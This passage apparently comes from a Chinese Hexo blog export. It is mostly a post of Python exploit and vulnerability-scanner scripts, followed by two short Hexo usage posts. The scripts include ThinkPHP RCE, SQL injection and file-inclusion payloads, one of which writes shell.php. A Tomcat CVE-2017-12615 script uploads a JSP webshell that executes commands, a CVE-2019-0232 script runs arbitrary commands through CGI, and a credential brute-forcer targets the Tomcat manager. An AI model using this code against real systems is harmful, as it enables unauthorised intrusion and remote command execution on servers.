class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> rich<br><span class="hljs-keyword">import</span> logging <br><span class="hljs-keyword">import</span> beautifyPrint <span class="hljs-keyword">as</span> rprint  <span class="hljs-comment">#为了美化输出</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>():<br>    <span class="hljs-keyword">return</span> datetime.datetime.now().strftime(<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tpScan</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp2_rce</span>(<span class="hljs-params">url</span>):<br>        result = &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;thinkphp 2x RCE&#x27;</span>,<br>            <span class="hljs-string">&#x27;vulnerable&#x27;</span>:<span class="hljs-literal">False</span>,<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            payload = <span class="hljs-string">&quot;?s=/Index/index/xxx/$&#123;var_dump(md5(123))&#125;&quot;</span><br>            url = urljoin(url,payload)<br>            response = requests.get(url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;202cb962ac59&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                result[<span class="hljs-string">&#x27;vulnerable&#x27;</span>] = <span class="hljs-literal">True</span><br>                result[<span class="hljs-string">&#x27;method&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>                result[<span class="hljs-string">&#x27;url&#x27;</span>] = url<br>                result[<span class="hljs-string">&#x27;payload&#x27;</span>] = payload<br>                <span class="hljs-keyword">return</span> result<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5023_rce</span>(<span class="hljs-params">url</span>):<br>        result = &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;thinkphp 5.0.23 RCE&#x27;</span>,<br>            <span class="hljs-string">&#x27;vulnerable&#x27;</span>:<span class="hljs-literal">False</span>,<br>        &#125;<br>        payload = &#123;<br>            <span class="hljs-string">&#x27;_method&#x27;</span>: <span class="hljs-string">&#x27;__construct&#x27;</span>,<br>            <span class="hljs-string">&#x27;filter[]&#x27;</span>: <span class="hljs-string">&#x27;phpinfo&#x27;</span>,<br>            <span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>            <span class="hljs-string">&#x27;server[REQUEST_METHOD]&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        <span class="hljs-comment">#方法二，将payload拆开写成headers的键值对形式传入</span><br>        <span class="hljs-keyword">try</span>:<br>            url1 = url+<span class="hljs-string">&#x27;/index.php?s=captcha&#x27;</span><br>            target = urljoin(url,url1)<br>            response = requests.post(url=target,data=payload,verify=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;PHP Version&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                result[<span class="hljs-string">&#x27;vulnerable&#x27;</span>] = <span class="hljs-literal">True</span><br>                result[<span class="hljs-string">&#x27;method&#x27;</span>] = <span class="hljs-string">&#x27;POST&#x27;</span><br>                result[<span class="hljs-string">&#x27;url&#x27;</span>] = target<br>                result[<span class="hljs-string">&#x27;payload&#x27;</span>] = payload<br>                <span class="hljs-keyword">return</span> result<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> result        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5x_rce</span>(<span class="hljs-params">url</span>):<br>        result = &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;thinkphp 5-5.0.22/5.1.29 RCE&#x27;</span>,<br>            <span class="hljs-string">&#x27;vulnerable&#x27;</span>:<span class="hljs-literal">False</span>,<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            poc = <span class="hljs-string">r&quot;/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=123&quot;</span><br>            payload = urljoin(url,poc)<br>            response = requests.get(payload,verify=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;202cb962ac590&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                result[<span class="hljs-string">&#x27;vulnerable&#x27;</span>] = <span class="hljs-literal">True</span><br>                result[<span class="hljs-string">&#x27;method&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>                result[<span class="hljs-string">&#x27;url&#x27;</span>] = payload<br>                result[<span class="hljs-string">&#x27;payload&#x27;</span>] = poc<br>                <span class="hljs-keyword">return</span> result<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5_sql</span>(<span class="hljs-params">url</span>):<br>        result = &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;thinkphp 5.0.9 sqlInjection and infoLeak&#x27;</span>,<br>            <span class="hljs-string">&#x27;vulnerable&#x27;</span>:<span class="hljs-literal">False</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            payload = urljoin(url,<span class="hljs-string">&#x27;/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&#x27;</span>)<br>            response = requests.get(payload,verify=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;XPATH syntax error&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                result[<span class="hljs-string">&#x27;vulnerable&#x27;</span>] = <span class="hljs-literal">True</span><br>                result[<span class="hljs-string">&#x27;method&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>                result[<span class="hljs-string">&#x27;url&#x27;</span>] = payload<br>                result[<span class="hljs-string">&#x27;payload&#x27;</span>] = <span class="hljs-string">&#x27;/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&#x27;</span><br>                <span class="hljs-keyword">return</span> result<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> result            <br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp6_lang</span>(<span class="hljs-params">url</span>):<br>        result = &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;thinkphp6 lang local file inclusion&#x27;</span>,<br>            <span class="hljs-string">&#x27;vulnerable&#x27;</span>:<span class="hljs-literal">False</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            payload = urljoin(url,<span class="hljs-string">&#x27;index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php&#x27;</span>)<br>            response = requests.get(url=payload,verify=<span class="hljs-literal">False</span>)<br>            url2 = urljoin(url,<span class="hljs-string">&#x27;/shell.php&#x27;</span>)<br>            response2 = requests.get(url2,verify=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> response2.status_code == <span class="hljs-number">200</span>:<br>                result[<span class="hljs-string">&#x27;vulnerable&#x27;</span>] = <span class="hljs-literal">True</span><br>                result[<span class="hljs-string">&#x27;method&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>                result[<span class="hljs-string">&#x27;url&#x27;</span>] = url2<br>                result[<span class="hljs-string">&#x27;payload&#x27;</span>] = <span class="hljs-string">&#x27;index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php&#x27;</span><br>                <span class="hljs-keyword">return</span> result<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_scan</span>(<span class="hljs-params">self</span>):<br>    scan = tpScan.thinkphp2_rce(self)<br>    rprint.info(get_time(),scan[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;  &#x27;</span>+<span class="hljs-built_in">str</span>(scan[<span class="hljs-string">&#x27;vulnerable&#x27;</span>])))<br><br>    scan = tpScan.thinkphp5023_rce(self)<br>    rprint.info(get_time(),scan[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;  &#x27;</span>+<span class="hljs-built_in">str</span>(scan[<span class="hljs-string">&#x27;vulnerable&#x27;</span>])))<br><br>    scan = tpScan.thinkphp5x_rce(self)<br>    rprint.info(get_time(),scan[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;  &#x27;</span>+<span class="hljs-built_in">str</span>(scan[<span class="hljs-string">&#x27;vulnerable&#x27;</span>])))<br><br>    scan = tpScan.thinkphp5_sql(self)<br>    rprint.info(get_time(),scan[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;  &#x27;</span>+<span class="hljs-built_in">str</span>(scan[<span class="hljs-string">&#x27;vulnerable&#x27;</span>])))<br><br>    scan = tpScan.thinkphp6_lang(self)<br>    rprint.info(get_time(),scan[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;  &#x27;</span>+<span class="hljs-built_in">str</span>(scan[<span class="hljs-string">&#x27;vulnerable&#x27;</span>])))<br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="/img/image-20231129181644713.png" alt="image-20231129181644713"> </p><p>存在的bug</p><p>使用文件时第1个和第2个漏洞没有扫出来，单个目标扫的时候能扫出来</p><p><img src="/img/image-20231129181748642.png" alt="image-20231129181748642"> </p><h2 id="tomcat漏洞扫描器"><a href="#tomcat漏洞扫描器" class="headerlink" title="tomcat漏洞扫描器"></a>tomcat漏洞扫描器</h2><h3 id="CVE-2017-12615任意文件上传"><a href="#CVE-2017-12615任意文件上传" class="headerlink" title="CVE-2017-12615任意文件上传"></a>CVE-2017-12615任意文件上传</h3><p>漏洞原理：&#x2F;conf&#x2F;web.xml(readonly&#x3D;False)  tomcat7.0.0-7.0.81</p><p>可以使用put方法上传任意文件</p><p>最新版的vulhub环境有问题，起CVE-2017-12615的环境出来的是8.5.19版本 无法复现该漏洞</p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;&quot;</span><br>payload_file = <span class="hljs-string">&#x27;shell.jsp/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cve_2017_12615</span>(<span class="hljs-params">url</span>):<br>    payload_url = url + payload_url<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,<br><br>    &#125;<br>    payload_body = (<span class="hljs-string">&quot;&lt;%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream();&quot;</span><br>                    <span class="hljs-string">&quot;int a = -1;&quot;</span><br>                    <span class="hljs-string">&quot;byte[] b = new byte[2048];&quot;</span><br>                    <span class="hljs-string">&quot;while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;&quot;</span><br>                    <span class="hljs-string">&quot;%&gt;&quot;</span>)<br>    <span class="hljs-comment">#用put把文件写入服务器</span><br>    response = requests.put(payload_url,data=payload_body,headers=headers)<br>    <span class="hljs-comment">#等待一会</span><br>    time.sleep(<span class="hljs-number">3</span>)<br>    test_payload = &#123;<br>        <span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;whoami&quot;</span><br>    &#125;<br>    <span class="hljs-comment">#带参数请求时不要最后的斜杠/</span><br>    response2 = requests.get(payload_url[:-<span class="hljs-number">1</span>],headers=headers,params=test_payload)<br>    <span class="hljs-keyword">if</span> response2.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cve_2017_12615(url)<br></code></pre></td></tr></table></figure><h3 id="CVE-2019-0232命令执行"><a href="#CVE-2019-0232命令执行" class="headerlink" title="CVE-2019-0232命令执行"></a>CVE-2019-0232命令执行</h3><p>windows环境下</p><p>jre将命令行传递给windows方式存在错误，会导致cgi-servlet远程代码执行</p><p>漏洞版本：</p><p>9.0.1-9.0.17   8.5.0-8.5.39   7.0.0-7.0.93</p><p>利用条件：</p><p>1.windows系统</p><p>2.cgi-servlet开启</p><p>poc:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/cgi-bin/hello.bat?&amp;C<span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>CWindows<span class="hljs-variable">%5</span>CSystem<span class="hljs-number">32</span><span class="hljs-variable">%5</span>C  后面跟命令<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231130152707388.png" alt="image-20231130152707388"></p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>payload = <span class="hljs-string">&quot;/cgi-bin/hello.bat?&amp;C%3A%5CWindows%5CSystem32%5C&quot;</span><br>cmd = sys.argv[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cve_2019_0232</span>(<span class="hljs-params">url</span>):<br>    payload_url = url+payload<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,<br><br>    &#125;<br>    <br>    response = requests.get(payload_url+cmd,headers=headers)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response.content.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cve_2019_0232(url)<br><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">0232</span>.<span class="hljs-keyword">py</span> ip <span class="hljs-keyword">command</span><br></code></pre></td></tr></table></figure><h3 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h3><p>当Tomcat使用了自带session同步功能时，使用不安全的配置(没有使用EncryptInterceptor)会存在反序列化漏洞，攻击者通过精心构造的数据包，可以对使用了自带session同步功能的Tomcat服务器进行攻击。</p><p>有点复杂和鸡肋 跳过</p><h3 id="tomcat弱口令-部署war包-getshell（重点）"><a href="#tomcat弱口令-部署war包-getshell（重点）" class="headerlink" title="tomcat弱口令+部署war包 getshell（重点）"></a>tomcat弱口令+部署war包 getshell（重点）</h3><p>弱口令：tomcat&#x2F;tomcat</p><p>路径：&#x2F;manager&#x2F;html</p><p>编码了账号密码：</p><p>Authorization: Basic dG9tY2F0OnRvbWNhdA&#x3D;&#x3D;</p><p>tomcat弱口令检测脚本</p><p>1.访问ip&#x2F;manager&#x2F;html</p><p>2.输入tomcat&#x2F;tomcat   进行base64编码</p><p>3.登录成功：200   失败：401</p><p><img src="/img/image-20231130160256722.png" alt="image-20231130160256722"></p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&#x27;http://10.210.100.131:8082/manager/html&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tomcat_weak_password</span>(<span class="hljs-params">url</span>):<br>    users = [<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;sysadmin&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;Administrator&#x27;</span>,<span class="hljs-string">&#x27;tomcat&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>]<br>    passwords = [<span class="hljs-string">&#x27;123456&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin666&#x27;</span>,<span class="hljs-string">&#x27;tomcat&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>]<br><br>    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users:<br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> passwords:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在测试账号密码：<span class="hljs-subst">&#123;u&#125;</span>:<span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>            tomcat_passwd = u.strip() + <span class="hljs-string">&quot;:&quot;</span> + p.strip()<br>            <span class="hljs-comment">#base64编码</span><br>            encoded_password = base64.b64encode(tomcat_passwd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            encoded_password_end = <span class="hljs-string">&#x27;Basic &#x27;</span> + <span class="hljs-built_in">str</span>(encoded_password,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            headers = &#123;<br>                <span class="hljs-string">&#x27;Authorization&#x27;</span>: encoded_password_end,<br>                <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36&#x27;</span>,<br><br>            &#125;<br>            response = requests.get(url=url,headers=headers)<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;存在弱口令！&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;账号密码：<span class="hljs-subst">&#123;u&#125;</span>:<span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>                <br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在弱口令&quot;</span>)<br><br><br>tomcat_weak_password(url)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何新建md文件并发布到github pages</title>
    <link href="/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/"/>
    <url>/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/</url>
    
    <content type="html"><![CDATA[<p>整体搭建教程：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p><h1 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h1><p>梯子+proxifier 流量代理  –&gt;  命令行中流量走代理</p><p>proxy servers + proxification rules</p><img src="/img/image-20230831201917406.png" alt="image-20230831201917406" style="zoom:50%;" /><img src="/img/image-20230831202133470.png" alt="image-20230831202133470" style="zoom:50%;" /><h1 id="如何新建md文件并发布到github-pages"><a href="#如何新建md文件并发布到github-pages" class="headerlink" title="如何新建md文件并发布到github pages"></a>如何新建md文件并发布到github pages</h1><h2 id="1-新建md文件"><a href="#1-新建md文件" class="headerlink" title="1.新建md文件"></a>1.新建md文件</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文件名&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201009555.png" alt="image-20230831201009555"></p><h2 id="2-保存并在本地查看"><a href="#2-保存并在本地查看" class="headerlink" title="2.保存并在本地查看"></a>2.保存并在本地查看</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201308965.png" alt="image-20230831201308965"></p><h2 id="3-保存并发布到github上"><a href="#3-保存并发布到github上" class="headerlink" title="3.保存并发布到github上"></a>3.保存并发布到github上</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g -d</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201512390.png" alt="image-20230831201512390"></p><p><img src="/img/image-20230831201529838.png" alt="image-20230831201529838"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/22/hello-world/"/>
    <url>/2023/08/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
